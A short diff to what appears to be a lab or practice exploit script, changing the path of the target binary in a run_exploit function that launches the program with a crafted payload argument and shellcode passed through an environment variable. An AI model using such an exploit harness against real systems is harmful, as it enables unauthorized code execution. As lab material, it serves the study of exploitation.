@@ -19,7 +19,7 @@ def run_exploit(offset, addr):
         f.write(payload)
     
     # Run the target program with the payload
-    p = subprocess.Popen(["/tmp/target1", payload], env={"SHELLCODE": shellcode}, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    p = subprocess.Popen(["/srv/target1", payload], env={"SHELLCODE": shellcode}, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output, error = p.communicate()
     
     # Check if the exploit was successful
